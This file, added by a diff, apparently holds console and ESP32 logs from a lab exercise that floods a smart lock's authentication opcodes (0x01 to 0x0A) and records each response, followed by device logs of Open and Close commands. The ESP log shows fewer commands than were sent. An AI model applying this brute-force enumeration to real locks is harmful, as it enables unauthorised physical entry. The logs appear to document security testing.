@@ -1,0 +1,44 @@
+[Full Console Output + ESP32 Logs]
+
+[1] Connecting to "Smart Lock [Group 11]"...
+[!] Serial Port: COM7
+[!] Connected.
+Starting AUTH opcode flood (0x01 to 0xFF)...
+[!] --> Command:  [1, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [3]
+[15:02:20.042] [CMD 001] AUTH=0x1 → Response: [3]
+[!] --> Command:  [2, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [3]
+[15:02:20.095] [CMD 002] AUTH=0x2 → Response: [3]
+[!] --> Command:  [3, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:20.158] [CMD 003] AUTH=0x3 → Response: [2]
+[!] --> Command:  [4, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:20.453] [CMD 004] AUTH=0x4 → Response: [2]
+[!] --> Command:  [5, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:20.995] [CMD 005] AUTH=0x5 → Response: [2]
+[!] --> Command:  [6, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:21.057] [CMD 006] AUTH=0x6 → Response: [2]
+[!] --> Command:  [7, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:21.104] [CMD 007] AUTH=0x7 → Response: [2]
+[!] --> Command:  [8, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:21.150] [CMD 008] AUTH=0x8 → Response: [2]
+[!] --> Command:  [9, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [2]
+[15:02:21.197] [CMD 009] AUTH=0x9 → Response: [2]
+[!] --> Command:  [10, 1, 2, 3, 4, 5, 6]
+[!] <-- Response: [0]
+[15:02:21.245] [CMD 010] AUTH=0xa → Response: [0]
+[!] Disconnecting...
+
+[ Full ESP32 Logs from this session]
+[15:02:24.482]  ESP → 
+[15:02:24.482]  ESP → [Bluetooth] User Connected
+[15:02:24.482]  ESP → [Bluetooth] Received command: 0x01 (Open)
+[15:02:24.482]  ESP → [Bluetooth] Received command: 0x02 (Close)
+[15:02:24.482]  ESP → [State] Servo Disabled
